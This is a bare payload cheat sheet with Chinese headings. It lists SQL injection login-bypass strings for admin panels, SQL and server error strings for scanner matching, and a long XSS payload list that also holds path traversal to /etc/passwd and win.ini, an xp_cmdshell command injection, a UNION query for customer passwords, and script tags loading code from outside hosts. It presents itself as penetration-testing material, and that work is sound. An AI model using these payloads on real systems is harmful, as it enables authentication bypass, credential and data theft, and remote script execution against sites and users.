# SQL万能密码
用于后台SQL注入测试

```
'or'='or'
'or''='
'or ''='
" or "a"="a
"or "a"="a
"or 1=1--
"or 1=1%00
"or"="a'='a
"or=or"
') or ('a'='a
')or('a'='a
1 or '1'='1' or 1=1
1 or '1'='1'=1
1'or'1'='1
admin' or 'a'='a 密码随便
admin'or'1'='1'--
admin' or '1'='1'--
a'or' 1=1--
a 'or' 1=1--
or 1=1--
'or 1=1--
'or' '1'='1
or 1=1-- '
'OR 1=1%00
or 'a'='a
'or'='1'
'or''=''or''='
' or ''=''or''='
'or'1'='1
' or '1'='1
'or'a'='a
' or 'a'='a
'xor
' UNION Select 1,1,1 FROM admin Where ''='
```

# SQL错误特征
用于扫描器匹配

```
A syntax error has occurred
ADODB.Field error
ASP.NET is configured to show verbose error messages
ASP.NET_SessionId
Active Server Pages error
An illegal character has been found in the statement
An unexpected token "END-OF-STATEMENT" was found
CLI Driver
Can't connect to local
Custom Error Message
DB2 Driver
DB2 Error
DB2 ODBC
Died at
Disallowed Parent Path
Error Diagnostic Information
Error Message : Error loading required libraries.
Error Report
Error converting data type varchar to numeric
Fatal error
Incorrect syntax near
Index of
Internal Server Error
Invalid Path Character
Invalid procedure call or argument
Invision Power Board Database Error
JDBC Driver
JDBC Error
JDBC MySQL
JDBC Oracle
JDBC SQL
Microsoft OLE DB Provider for ODBC Drivers
Microsoft VBScript compilation error
Microsoft VBScript error
MySQL Driver
MySQL Error
MySQL ODBC
ODBC DB2
ODBC Driver
ODBC Error
ODBC Microsoft Access
ODBC Oracle
ODBC SQL
ODBC SQL Server
OLE/DB provider returned message
ORA-0
ORA-1
Oracle DB2
Oracle Driver
Oracle Error
Oracle ODBC
PHP Error
PHP Parse error
PHP Warning
Parent Directory
Permission denied: 'GetObject'
PostgreSQL query failed: ERROR: parser: parse error
SQL Server Driver][SQL Server
SQL command not properly ended
SQLException
Supplied argument is not a valid PostgreSQL result
Syntax error in query expression
The error occurred in
The script whose uid is
Type mismatch
Unable to jump to row
Unclosed quotation mark before the character string
Unterminated string constant
Warning: Cannot modify header information - headers already sent
Warning: Supplied argument is not a valid File-Handle resource in
Warning: mysql_query()
Warning: pg_connect(): Unable to connect to PostgreSQL server: FATAL
You have an error in your SQL syntax near
data source=
detected an internal error [IBM][CLI Driver][DB2/6000]
error
include_path
invalid query
is not allowed to access
line
missing expression
mySQL error with query
mysql error
on MySQL result index
on line
server at
server object error
supplied argument is not a valid MySQL result resource
unexpected end of SQL command
```

# XSS Payload
用于测试XSS跨站脚本攻击

```
    '><script>alert(document.cookie)</script>
    ='><script>alert(document.cookie)</script>
    <script>alert(document.cookie)</script>
    <script>alert(vulnerable)</script>
    %3Cscript%3Ealert('XSS')%3C/script%3E
    <script>alert('XSS')</script>
    <img src="javascript:alert('XSS')">
    %0a%0a<script>alert(\"Vulnerable\")</script>.jsp
    %22%3cscript%3ealert(%22xss%22)%3c/script%3e
    %2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
    %2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini
    %3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e
    %3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e
    %3cscript%3ealert(%22xss%22)%3c/script%3e/index.html
    %3f.jsp
    %3f.jsp
    <script>alert('Vulnerable');</script>
    <script>alert('Vulnerable')</script>
    ?sql_debug=1
    a%5c.aspx
    a.jsp/<script>alert('Vulnerable')</script>
    a/
    a?<script>alert('Vulnerable')</script>
    "><script>alert('Vulnerable')</script>
    ';exec%20master..xp_cmdshell%20'dir%20 c:%20>%20c:\inetpub\wwwroot\?.txt'--&&
    %22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
    %3Cscript%3Ealert(document. domain);%3C/script%3E&
    %3Cscript%3Ealert(document.domain);%3C/script%3E&SESSION_ID={SESSION_ID}&SESSION_ID=
    1%20union%20all%20select%20pass,0,0,0,0%20from%20customers%20where%20fname=
    http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/http://www.cnblogs.com/etc/passwd
    ..\..\..\..\..\..\..\..\windows\system.ini
    \..\..\..\..\..\..\..\..\windows\system.ini
    '';!--"<XSS>=&{()}
    <IMG src="javascript:alert('XSS');">
    <IMG src=javascript:alert('XSS')>
    <IMG src=JaVaScRiPt:alert('XSS')>
    <IMG src=JaVaScRiPt:alert("XSS")>
    <IMG src=javascript:alert('XSS')>
    <IMG src=javascript:alert('XSS')>
    <IMG src=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
    <IMG src="jav ascript:alert('XSS');">
    <IMG src="jav ascript:alert('XSS');">
    <IMG src="jav ascript:alert('XSS');">
    "<IMG src=java\0script:alert(\"XSS\")>";' > out
    <IMG src=" javascript:alert('XSS');">
    <SCRIPT>a=/XSS/alert(a.source)</SCRIPT>
    <BODY BACKGROUND="javascript:alert('XSS')">
    <BODY ONLOAD=alert('XSS')>
    <IMG DYNSRC="javascript:alert('XSS')">
    <IMG LOWSRC="javascript:alert('XSS')">
    <BGSOUND src="javascript:alert('XSS');">
    <br size="&{alert('XSS')}">
    <LAYER src="http://xss.ha.ckers.org/a.js"></layer>
    <LINK REL="stylesheet" href="javascript:alert('XSS');">
    <IMG src='vbscript:msgbox("XSS")'>
    <IMG src="mocha:[code]">
    <IMG src="livescript:[code]">
    <META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
    <IFRAME src=javascript:alert('XSS')></IFRAME>
    <FRAMESET><FRAME src=javascript:alert('XSS')></FRAME></FRAMESET>
    <TABLE BACKGROUND="javascript:alert('XSS')">
    <DIV STYLE="background-image: url(javascript:alert('XSS'))">
    <DIV STYLE="behaviour: url('http://www.how-to-hack.org/exploit.html');">
    <DIV STYLE="width: expression(alert('XSS'));">
    <STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
    <IMG STYLE='xss:expre\ssion(alert("XSS"))'>
    <STYLE TYPE="text/javascript">alert('XSS');</STYLE>
    <STYLE TYPE="text/css">.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A class="XSS"></A>
    <STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
    <BASE href="javascript:alert('XSS');//">
    getURL("javascript:alert('XSS')")
    a="get";b="URL";c="javascript:";d="alert('XSS');";eval(a+b+c+d);
    <XML src="javascript:alert('XSS');">
    "> <BODY ONLOAD="a();"><SCRIPT>function a(){alert('XSS');}</SCRIPT><"
    <SCRIPT src="http://xss.ha.ckers.org/xss.jpg"></SCRIPT>
    <IMG src="javascript:alert('XSS')"
    <!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://xss.ha.ckers.org/a.js></SCRIPT>'"-->
    <IMG src="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
    <SCRIPT a=">" src="http://xss.ha.ckers.org/a.js"></SCRIPT>
    <SCRIPT =">" src="http://xss.ha.ckers.org/a.js"></SCRIPT>
    <SCRIPT a=">" '' src="http://xss.ha.ckers.org/a.js"></SCRIPT>
    <SCRIPT "a='>'" src="http://xss.ha.ckers.org/a.js"></SCRIPT>
    <SCRIPT>document.write("<SCRI");</SCRIPT>PT src="http://xss.ha.ckers.org/a.js"></SCRIPT>
    <A href=http://www.gohttp://www.google.com/ogle.com/>link</A>
```
